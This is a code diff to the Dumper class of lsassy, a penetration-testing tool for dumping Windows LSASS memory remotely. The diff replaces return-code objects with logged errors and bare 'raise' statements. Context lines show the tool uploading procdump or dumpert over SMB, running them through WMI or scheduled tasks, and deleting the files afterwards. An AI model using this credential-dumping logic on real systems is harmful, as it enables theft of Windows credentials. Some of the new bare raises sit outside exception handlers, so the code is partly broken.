@@ -55,13 +55,15 @@ class Dumper:
     def getfile(self):
         if isinstance(self._ifile, ImpacketFile):
             return self._ifile
-        return RetCode(ERROR_UNDEFINED, Exception("Trying to return an object which is not an Impacket file"))
+        self._log.error("Trying to return {} which is not an Impacket file".format(type(self._ifile)))
+        raise
 
     def close(self):
         if isinstance(self._ifile, ImpacketFile):
             self._ifile.close()
-            return RetCode(ERROR_SUCCESS)
-        return RetCode(ERROR_UNDEFINED, Exception("Trying to close an object which is not an Impacket file"))
+            return ERROR_SUCCESS
+        self._log.error("Trying to close {} which is not an Impacket file".format(type(self._ifile)))
+        raise
 
     def dump(self):
         """
@@ -111,7 +113,8 @@ class Dumper:
             ]
         else:
             self._log.debug("Method \"{}\" is not supported (0-5). See -h for help".format(self._method))
-            return RetCode(ERROR_METHOD_NOT_SUPPORTED)
+            self._log.error(ERROR_METHOD_NOT_SUPPORTED)
+            raise
 
         ifile = ImpacketFile(self._conn, self._log)
         for dump_methodology in dump_methodologies:
@@ -137,17 +140,19 @@ class Dumper:
                 if isinstance(ret, ImpacketFile):
                     if ifile.size() == 0 or (ifile.size() < 100 and ifile.read(6).decode('utf-8') == "FAILED"):
                         ifile.close()
-                        return RetCode(ERROR_LSASS_PROTECTED)
+                        self._log.error(ERROR_LSASS_PROTECTED)
+                        raise
                     ifile.seek(0)
                     self._ifile = ifile
-                    return RetCode(ERROR_SUCCESS)
+                    return ERROR_SUCCESS
                 else:
                     self._log.warn("No dump file found with \"{}\" using \"{}\" exec method.".format(dump_method, exec_shell))
 
         """
         If no dump file was found, it means that procdump didn't crash, so it may take more time than expected.
         """
-        return RetCode(ERROR_SLOW_TARGET)
+        self._log.error(ERROR_SLOW_TARGET)
+        raise
 
     def dll_dump(self, exec_methods=("wmi", "task"), exec_shell="cmd"):
         if exec_shell == "cmd":
@@ -163,7 +168,8 @@ class Dumper:
                 ),
             ]
         else:
-            return RetCode(ERROR_METHOD_NOT_SUPPORTED)
+            self._log.error(ERROR_METHOD_NOT_SUPPORTED)
+            raise
 
         self._log.debug("Commands : ")
         for command in commands:
@@ -174,11 +180,12 @@ class Dumper:
                 self._log.debug("Trying exec method : \"{}\"".format(exec_method))
                 self._exec_methods[exec_method](self._conn, self._log).execute(commands)
                 self._log.debug("Exec method \"{}\" success !".format(exec_method))
-                return RetCode(ERROR_SUCCESS)
+                return ERROR_SUCCESS
             except Exception as e:
                 self._log.warn("Exec method \"{}\" failed.".format(exec_method))
                 self._log.debug('Error : {}'.format(e))
-        return RetCode(ERROR_DLL_NO_EXECUTE)
+        self._log.error(ERROR_DLL_NO_EXECUTE)
+        raise
 
     def procdump_dump(self, exec_methods=("wmi", "task")):
         """
@@ -187,19 +194,22 @@ class Dumper:
         """
         if not self._procdump_path:
             self._log.warn("Procdump path has not been provided")
-            return RetCode(ERROR_PROCDUMP_NOT_PROVIDED)
+            self._log.error(ERROR_PROCDUMP_NOT_PROVIDED)
+            raise
         # Verify procdump exists on host
         if not os.path.exists(self._procdump_path):
             self._log.warn("{} does not exist.".format(self._procdump_path))
-            return RetCode(ERROR_PROCDUMP_NOT_FOUND)
+            self._log.error(ERROR_PROCDUMP_NOT_FOUND)
+            raise
 
         # Upload procdump
         self._log.debug('Copy {} to {}'.format(self._procdump_path, self._tmp_dir))
         with open(self._procdump_path, 'rb') as procdump:
             try:
                 self._conn.putFile(self._share, self._tmp_dir + self._procdump, procdump.read)
-            except Exception as e:
-                return RetCode(ERROR_PROCDUMP_NOT_UPLOADED)
+            except Exception:
+                self._log.error(ERROR_PROCDUMP_NOT_UPLOADED)
+                raise
         self._use_procdump = True
 
         # Dump lsass using PID
@@ -221,11 +231,12 @@ class Dumper:
                 self._log.debug("Trying exec method : " + exec_method)
                 self._exec_methods[exec_method](self._conn, self._log).execute(commands)
                 self._log.debug("Exec method \"{}\" success !".format(exec_method))
-                return RetCode(ERROR_SUCCESS)
+                return ERROR_SUCCESS
             except Exception as e:
                 self._log.warn("Exec method \"{}\" failed.".format(exec_method))
                 self._log.debug("Error : {}".format(str(e)))
-        return RetCode(ERROR_PROCDUMP_NO_EXECUTE)
+        self._log.error(ERROR_PROCDUMP_NO_EXECUTE)
+        raise
 
     def dumpert_dump(self, exec_methods=("wmi", "task")):
         """
@@ -234,19 +245,22 @@ class Dumper:
         """
         if not self._dumpert_path:
             self._log.warn("dumpert path has not been provided")
-            return RetCode(ERROR_DUMPERT_NOT_PROVIDED)
+            self._log.error(ERROR_DUMPERT_NOT_PROVIDED)
+            raise
         # Verify dumpert exists on host
         if not os.path.exists(self._dumpert_path):
             self._log.warn("{} does not exist.".format(self._dumpert_path))
-            return RetCode(ERROR_DUMPERT_NOT_FOUND)
+            self._log.error(ERROR_DUMPERT_NOT_FOUND)
+            raise
 
         # Upload dumpert
         self._log.debug('Copy {} to {}'.format(self._dumpert_path, self._tmp_dir))
         with open(self._dumpert_path, 'rb') as dumpert:
             try:
                 self._conn.putFile(self._share, self._tmp_dir + self._dumpert, dumpert.read)
-            except Exception as e:
-                return RetCode(ERROR_DUMPERT_NOT_UPLOADED)
+            except Exception:
+                self._log.error(ERROR_DUMPERT_NOT_UPLOADED)
+                raise
         self._use_dumpert = True
         self._remote_lsass_dump = "dumpert.dmp"
         # Dump lsass using PID
@@ -266,16 +280,17 @@ class Dumper:
                 self._log.debug("Trying exec method : " + exec_method)
                 self._exec_methods[exec_method](self._conn, self._log).execute(commands)
                 self._log.debug("Exec method \"{}\" success !".format(exec_method))
-                return RetCode(ERROR_SUCCESS)
+                return ERROR_SUCCESS
             except Exception as e:
                 self._log.warn("Exec method \"{}\" failed.".format(exec_method))
                 self._log.debug("Error : {}".format(str(e)))
-        return RetCode(ERROR_DUMPERT_NO_EXECUTE)
+        self._log.error(ERROR_DUMPERT_NO_EXECUTE)
+        raise
 
     def clean(self):
         try:
             self._ifile.close()
-        except Exception as e:
+        except Exception:
             pass
 
         try:
@@ -297,20 +312,20 @@ class Dumper:
                         self._tmp_dir + self._remote_lsass_dump))
                 except:
                     self._log.error("Dump file \"{}\" wasn't removed. An error occurred.".format(self._tmp_dir + self._remote_lsass_dump))
-                    lsassy_warn(self._log, RetCode(ERROR_DUMP_CLEANING, e))
+                    lsassy_warn(self._log, ERROR_DUMP_CLEANING)
 
         if self._use_procdump:
             # Delete procdump.exe
             try:
                 self._conn.deleteFile(self._share, self._tmp_dir + self._procdump)
-            except Exception as e:
-                lsassy_warn(self._log, RetCode(ERROR_PROCDUMP_CLEANING, e))
+            except Exception:
+                lsassy_warn(self._log, ERROR_PROCDUMP_CLEANING)
 
         if self._use_dumpert:
             # Delete dumpert.exe
             try:
                 self._conn.deleteFile(self._share, self._tmp_dir + self._dumpert)
-            except Exception as e:
-                lsassy_warn(self._log, RetCode(ERROR_DUMPERT_CLEANING, e))
+            except Exception:
+                lsassy_warn(self._log, ERROR_DUMPERT_CLEANING)
 
-        return RetCode(ERROR_SUCCESS)
+        return ERROR_SUCCESS
